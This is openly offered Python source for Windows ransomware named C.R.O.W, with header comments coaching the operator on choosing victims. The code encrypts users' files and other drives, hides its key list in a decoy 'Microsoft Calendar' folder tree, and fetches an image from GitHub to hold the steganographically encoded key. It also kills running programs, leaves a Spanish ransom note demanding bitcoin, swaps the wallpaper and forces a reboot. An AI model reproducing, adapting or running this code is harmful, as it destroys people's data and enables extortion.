#  This is a ransomware that is designed for Windows 10 & 11 made to corrupt targeted files and programs as admin,
#  this is the version 9.0 called Covert Ransomware Operation Weapon (C.R.O.W) and it is paired with the decryption 
#  software OTTER, this malware is designed to work in the following way:


#  First it will find all of the users in the system incase there is more than one, after this inside of
#  that user, it will find the directories you want to target. (You can change them in the code
#  once you studied your victim.) After, it will attack any additional folders that you want even if they
#  are outside of the users. (Normally used to target programs, but you can get creative if you want.)
#  And it will list all of the drives except C: as targets. 

#  Once all of this is done it will create a fake directory tree, that looks like a component of Windows
#  but surprise, it isn't. Inside of this fake tree there will be many fake files that are generated randomly,
#  the names and contents are also generated randomly, as well as the amount of files per directory
#  (You can also change it in the code.) the contents are filled with random non human recognizable
#  characters, all of this is designed to create confusion to a IT guy that does not know much
#  about cyberattacks, the reason there is so much fake bullshit in there is because in all of that mess of
#  folders and files, the ransomware stores its vital files, the key and the list.

#  Once the fake directory has been filled it will download the image from the attack server, this image is
#  vital because the stenography module will encode the encryption key inside of the image.

#  Now for the actual attack; a loop is created, this loop will run until the last target file has been
#  attempted to encrypt, the reason I say attempted is because even as admin, windows will not let you
#  modify the files that "TrustedInstaller" owns. The way the loop works is simple:

#       1st. It will close all selected programs so that they can be encrypted. (It also scares the victim.)

#       2nd. It will start the counters, one for files scanned, another for files encrypted.

#       3rd. It will declare the exceptions, such as desktop.ini and every file that
#       does not start with a letter or number and is bigger than 1GB the reason is that 
#       python runs out of memory, but you can change the size limit).

#       4th. It will start reading all files from all targets and if it has writing permission it will
#       encrypt them, and if it can't, it will declare it as an exception.

#       5th. Every 500 files that are encrypted it reesends a signal to close all selected programs
#       this is done for two reasons, the first is to ensure the victim can't do anything useful while
#       the attack is executing, and the second reason is to ensure that the encrypter can access them.

#  After all of this is done, it will save a list with the route and name of the files that were encrypted,
#  this list is very important; without it, the decryption software will never be able to fix the damage.
#  This list is stored in the fake tree that we have created previously.

#  For a grand finale, it will detect where your Desktop is, and leave a note informing the victim 
#  that they were attacked and what to do to get their files back, as well as changing the wallpaper.
#  Lastly it restarts the computer.


#  SIDE NOTE FOR PEOPLE WHO WANT TO USE THIS ON A VICTIM WITH WINDOWS INSTALLED IN A DRIVE OTHER THAN C:

#  If windows is installed in another place than C:, CROW should work (not tested) but it will take hours to 
#  execute the attack. This code does support the posibility of adding a Windows location detector module but 
#  we did not implement it because this is already mandness, if you had the incredible bad luck of studying the 
#  victim and realized that windows is installed elsewhere, just give up and go for another one, they win, it is
#  not worth it, but if you really need to do it, you can.

### THE CODE STARTS HERE ###

# Necesary imports.
import os
import random
import time
import subprocess
import shutil
import ctypes
import urllib.request
import png
import base64
import string
import win32api
from ctypes import windll
from cryptography.fernet import Fernet
from winshell import win32con

# Declares THE START OF TIME.
start = time.time()

# Defines the end of message.
ENDOFMESSAGE = "0100100101010101010101100100111101010010010001010011100101000111010101000101010101010110010101000101010100110000010001100100100001010010010100110100010100111101"

def encode_message_as_bytestring(message):
	b64 = message.encode("utf8")
	bytes_ = base64.encodebytes(b64)
	bytestring = "".join(["{:08b}".format(x) for x in bytes_])
	bytestring += ENDOFMESSAGE
	return bytestring

def get_pixels_from_image(fname):
	img = png.Reader(fname).read()
	pixels = img[2]
	return pixels

def encode_pixels_with_message(pixels, bytestring):
	'''modifies pixels to encode the contents from bytestring'''

	enc_pixels = []
	string_i = 0
	for row in pixels:
		enc_row = []
		for i, char in enumerate(row):
			if string_i >= len(bytestring): 
				pixel = row[i]
			else:
				if row[i] % 2 != int(bytestring[string_i]):
					if row[i] == 0:
						pixel = 1
					else:
						pixel = row[i] - 1
				else:
					pixel = row[i]
			enc_row.append(pixel)
			string_i += 1

		enc_pixels.append(enc_row)
	return enc_pixels

def write_pixels_to_image(pixels, fname):
	png.from_array(pixels, 'RGB').save(fname)

def decode_pixels(pixels):
	bytestring = []
	for row in pixels:
		for c in row:
			bytestring.append(str(c % 2))
	bytestring = ''.join(bytestring)
	message = decode_message_from_bytestring(bytestring)
	return message

def decode_message_from_bytestring(bytestring):
	bytestring = bytestring.split(ENDOFMESSAGE)[0]
	message = int(bytestring, 2).to_bytes(len(bytestring) // 8, byteorder='big')
	message = base64.decodebytes(message).decode("utf8")
	return message

# This will find the users.
def findUsers(directory):
    users = []      
    # Scan the users that exist inside of C:\Users.                                                                
    for f in os.scandir(directory):                                          
        if f.name[0].isalpha() and f.is_dir() and not f.name == 'Default User' and not f.name == 'All Users' and not f.name == 'Default' and not f.name == 'Public':     
            users.append(f.path)                                                    
    return users                                                                    

# This will find the target foldrs inside of each user.
def findFolders(users, target_dirs):
    folders = []                                                    # Create a empty list for folders.
    for user in users:                                              # For the users in the user list.
        for target in target_dirs:                                  # And for the targets in the target directories.
            nodrive_name = os.path.join(user, target)               # Join the name of the user with the target directory.
            folders.append(nodrive_name)                            # Add it to folders.
    clean_folder = []                                               # Create a empty list for a clean folder.
    for fld in folders:                                             # For the folders in the previous list.
        if os.path.isdir(fld):                                      # If it exists.
            clean_folder.append(fld)                                # Get the path for them.
    return clean_folder                                             # Put it in the clean folder list.

# This will find the desktops of every user.
def findDesktops(users, desk_sys):
    desktops = []                                                   
    for user in users:                                              
        for target in desk_sys:                                     
            join = os.path.join(user, target)                      
            desktops.append(join)                                  
    return desktops

# This will create the fake directory tree.
def createFolders(mydirlist):                                       
    for mydir in mydirlist:
        if not os.path.exists(mydir):
            os.makedirs(mydir)

# This creates a random text generator to fill the fake files, for the fake tree.
def fillme(treeseeds1):
    # Define extraction of one element from a list. 
    def randWord(tupleChoice):                                      
        return random.choice(tupleChoice)
    
    # This creates a list of things to create the names of the fake files.
    def randNameGen():                                                          # List of posible choices.
        frst_comp = '', '', 'ms',    'Windows', 'bin',     'Framework', 'Managed' 'Net',       'file',  'config'
        scnd_comp = '', '', 'Exec',  '32',      'Help',    'binaries',  'sign'    'List',      'app',   'crt'
        thrd_comp = 'Temp', 'Setup', 'DMR_48',  'Tracker', 'vcp',       'Core',   'Collector', 'Build', 'Features', 'Platform'
        extension = '.dll', '.mui',  '.exe',    '.winmd',  '.xml',      '.ccp',   '.h',        '.idl',  '.pak',     '.json'

        # This puts the things toguether for naming the files.
        while True:
            fc = randWord(frst_comp)
            sc = randWord(scnd_comp)
            tc = randWord(thrd_comp)
            ex = randWord(extension)
            tog = fc, sc, tc, ex
            ftog = ''.join(tog)
            yield ftog

    # This converts normal letters to weird characters.
    def getAplpha(simple):                                                      # Normal alphabet.
        if simple:                                                  
            return '0123456789ABCDEF'                                          
        
        # This mixes normal and unreadeable alphabet.
        def convChar(x):
            nonprintable = {                                                    # List of printable characters to not printable.
                '\x00': '^@',
                '\x01': '^A',
                '\x02': '^B',
                '\x03': '^C',
                '\x04': '^D',
                '\x05': '^E',
                '\x06': '^F',
                '\x07': '^G',
                '\x08': '^H',
                '\x09': '^I',
            }
            character = chr(x)                                         # Gets characters one by one.
            return nonprintable.get(character, character)              # Returns the x even if it is or it isn't in the non printable.
        alphabet = random.sample(list(range(128)), 16)                 # Choose 16 numbers between 0 and 128
        alphabet = list(map(lambda x : convChar(x), alphabet))         # Creates a list that converts the intitures to characters, 
                                                                       # if it is in the non printable list it gets converted.  
        return ''.join(alphabet)                                       # Returns a joined version of the alphabet as a string.

    # This will use our random variable alphabet to create text. 
    def randText(number_of_words):
        words = ["#"+''.join([random.choice(getAplpha(False)) for j in range(random.randint(1, 12))]) # It will create a word
    # that starts with # and then it will join toguether characters in a random range from 1 to 12.                                                
            for i in range(number_of_words)]                                                          # Repeat a number of times.
        return ''.join(words)                                                                         # Joins words.

    # This specifies the random ammount of files per directory.
    MIN_FILES = 0
    MAX_FILES = 16

    # Make the generator
    name_gen = randNameGen()

    # Define the number of times that this porcess will ocurr per directory.
    numbers = [random.randint(MIN_FILES, MAX_FILES) for _ in treeseeds1]

    # Creates a loop 
    for numb, root in zip(numbers, treeseeds1):     # It creates a variable numb for numbers and root for treeseeds1.
        for _ in range(numb):                       
            name = next(name_gen)                   # Gives the generated name.
            f11_name = os.path.join(root, name)     # Creates route to create the file.
            volume = random.randint(2000, 8000)     # Range of how many words per text.
            with open(f11_name, 'w') as f:          # Creates file.
                text_info = randText(volume)        # Generates the random text in the cuantity of words.
                f.write(text_info)                  # Puts it in the file.

# This will find the dektop and write the threat note.
def desktop_mv(threatAddress):
    if not os.path.isdir(threatAddress):                                       
        return
    
    # This writtes the note that will be left in the victims desktop.
    contents = 'Hemos encriptado todos sus archivos. \n\
Si quereis desencriptarlos teneis 48 horas para enviar \
X BTC a la siguiente direccion \n\
XXXXXX \n\
De lo contrario seran eliminados. \n\
Una vez se haya realizado el pago recibireis \
Instrucciones de como desencriptarlos. \n\
Muchas gracias por su amable colaboracion ;-)'

    # This moves al files to a directory made by us and creates the note in desktop.
    Temp1 = fr'{threatAddress}\Infectado'                             
    os.makedirs(Temp1)                                                  

    # This moves all of the files from desktop to the directory.
    for file_name1 in os.listdir(threatAddress):                       
        if 'Infectado' == file_name1:
                continue
        source1 = os.path.join(threatAddress, file_name1)
        destination1 = os.path.join(Temp1, file_name1)  
        shutil.move(source1, destination1)

    with open(fr'{threatAddress}\INSTRUCCIONES_DEL_ATAQUE.txt', 'w') as f:        
        f.write(contents) 

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

# This tells the malware were the users are in windows.
directory = r'C:\Users'
users = findUsers(directory)

# This makes the target directories inside of user.
target_dirs = [
    'Desktop',
    'Downloads',
    'Documents',
    'Escritorio',
    'Descargas',
    'Documentos',
]

# This makes sure they are inside of users.
folders = findFolders(users, target_dirs)

# These directories are a list for targeting the entire system. 
# (Originally made to corrupt programs, but be creative.) 

# My personal recomendation is to be as precise as possible in the targets, killing everything takes a long time,
# killing just the essencial program files not so much, allways asume victims computers are slow.
raw_additional_folders = [
    r'C:\Program Files\LibreOffice',
]

# Lists all of the possible drives and skips the RECOVERY partition.
units = []
for n in range (97, 123):
    if n == 99:
        continue 
    dname = f'{chr(n)}:\\'
    finfo = win32api.GetVolumeInformation(dname)
    infoname = finfo[0]
    if infoname == "RECOVERY":
        continue
    units.append(dname)

# Adds all of the drives to the additional folders.
raw_additional_folders += units

# This puts all of the aditional files toguether.
additional_folders = []
for fld in raw_additional_folders:
    if os.path.isdir(fld):
        additional_folders.append(fld)

# This builds all of the target directories by putting toguether the user targets and the system targets.
folders_tog = folders + additional_folders

# This will give you feedback of what directories you are targeting. (Really important if you fucked up.)
print(folders_tog)

# This is a list of all of the directories that are going to be built in the fake tree, 
# used for confusion and to store our vital files (Encryption key and List of encrypted files.)
mydirlist = [
     
    r'C:\Program Files (x86)\Microsoft Calendar',

    # Kits.
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\8.1',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\8.1\References',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\8.1\References\CommonConfiguration',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\8.1\References\CommonConfiguration\Neutral',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\8.1\References\CommonConfiguration\Neutral\Annotated',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\10',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\10\Resources',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Kit\10\References',                       
    
    # Calendar Mail.
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.14393.0',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.14393.0\x64',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.14393.0\x86',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.15063.0',
    # Wallpaper
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.15063.0\x64',

    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.15063.0\x86',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.16299.0',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.16299.0\x64',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.16299.0\x86',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.17134.0',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.17134.0\x64',
    # I like this one for List. Number 24
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.17134.0\x86',

    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.22621.0',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.22621.0\x64',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.22621.0\x86',

    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\arm',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\arm\XamlDiagnostics',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\arm64',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\arm64\XamlDiagnostics',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\x64',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\x64\XamlDiagnostics',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\x86',
    r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\x86\XamlDiagnostics',

    # Platform.
    r'C:\Program Files (x86)\Microsoft Calendar\Platform',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Configuration',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Configuration\PackageManegement',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Configuration\PackageManegement\1.0.0.1',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Modules',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Modules\Registration',
    r'C:\Program Files (x86)\Microsoft Calendar\Platform\Modules\Schema',
    
    # Accessories. 
    r'C:\Program Files (x86)\Microsoft Calendar\Accessories',
    r'C:\Program Files (x86)\Microsoft Calendar\Accessories\es-ES',
    r'C:\Program Files (x86)\Microsoft Calendar\Accessories\TableTextService',
]

# This specifies in what directory of the list we will store our vital files. In this case in the:
# C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.17134.0\x86
storage = mydirlist [24] 

# This actually creates the directory tree.
createFolders(mydirlist)

# This fills the directory tree with random bullshit. (https://i.kym-cdn.com/photos/images/newsfeed/002/638/553/929.jpg)
fillme(mydirlist)

# Download Wallpaper Image.
url = "https://github.com/AlexanderBissett/Yurii-is-a-idiot/raw/main/jytrhd.png"

# Address where it will be saved.
address = r"C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.15063.0\x64\jytrhd.png"

# Execute download to specified address.
filename, headers = urllib.request.urlretrieve(url, filename = address)

# This builds the encryption key. (Vital for dencryption.)
key = Fernet.generate_key()
# Clean key in UTF-8.
text_key = key.decode('utf-8')
# Image from where we will store the key.
in_image = r'C:\Program Files (x86)\Microsoft Calendar\Calendar Mail\Import Tool\bin\10.0.15063.0\x64\jytrhd.png'
# The secret message we encode in the image is the key.
in_message = text_key

pixels = get_pixels_from_image(in_image)
bytestring = encode_message_as_bytestring(in_message)
epixels = encode_pixels_with_message(pixels, bytestring)
# New image with key.
write_pixels_to_image(epixels, in_image + "D.png")

# This creates the empty list of targets.
result = []

# This creates 2 counters, one for files seen count_s and one for files encrypted, count_e.
count_s = 0
count_e = 0

# This is the loop that encrypts files 
for folder in folders_tog:
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:

            if 0 == count_e%50:
                print(f'Files Infected {count_e}')
            count_s += 1
            if 0 == count_s%50:
                print(f'Files Seen {count_s}')
            if filename == 'desktop.ini':
                continue

            # Exception created for every file that does not start in a number or letter. 
            # (Weird windows files start with symbols and are protected, we dont want to waste time.)
            if not filename[0].isalpha() and not filename[0].isdigit():
                continue

            name = os.path.join(dirpath, filename)

            # Size checker.
            file_stats = os.stat(name)
            fsize = file_stats.st_size
            size_mb = fsize / (1024 * 1024)

            if size_mb > 1024:
                continue

            with open (name, 'rb') as f:
                content = f.read()
            content_encripted = Fernet(key).encrypt(content)

            try:
                with open (name, 'wb') as f:
                    f.write(content_encripted)

            except Exception as e:
                print(e)
                continue

            # Get the name (route+file) of everything you encrypted
            result.append(name)

            # At the start of the attack and every 500 files encrypted, send a signal to close the listed programs.
            if count_e%500 == 0:
                subprocess.call("TASKKILL /F /IM msedge.exe", shell=True)
                subprocess.call("TASKKILL /F /IM firefox.exe", shell=True)
                subprocess.call("TASKKILL /F /IM soffice.exe", shell=True)
                subprocess.call("TASKKILL /F /IM swriter.exe", shell=True)
                subprocess.call("TASKKILL /F /IM soffice.bin", shell=True) # Remember that office software has a temp copy of everything,
                                                                           # close this or it won't close.
            count_e += 1

# Give feedback of how many files in total have been encrypted.
print(len(result))

# This writes a list of everything that was encrypted and were it was when it was encrypted.
with open(fr'{storage}\ConfigListTracker.txt', 'w') as f:    
    for line in result:                                       
        f.write(f"{line}\n")

# List of all posible locations for the desktop.
desk_sys = [
    r'Desktop\\',
    r'OneDrive\Desktop\\',
    r'Escritorio\\',
    r'OneDrive\Escritorio\\'
]

# Gets the full addresses for desktop posibilities.
desktops = findDesktops(users, desk_sys)

# Loop that goes through the options for the possible locations of desktop.
for options in desktops:
    desktop_mv(options)

# Delete old image without the key
os.remove(address)

# Define location of our new wallpaper. 
address_wall = (address + "D.png")

# Replace windows wallpaper with our image.
ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, address_wall , 3)

# Declares THE END OF TIME.
end = time.time()

# Print how long the code took to run.
print (end-start)

# Wait 5 seconds.
time.sleep (5)

# This reestarts the computer at the end of the attack, this is done mainly to anoy.
os.system("shutdown -r -t 1")

# THE END.

# Happy hunting.
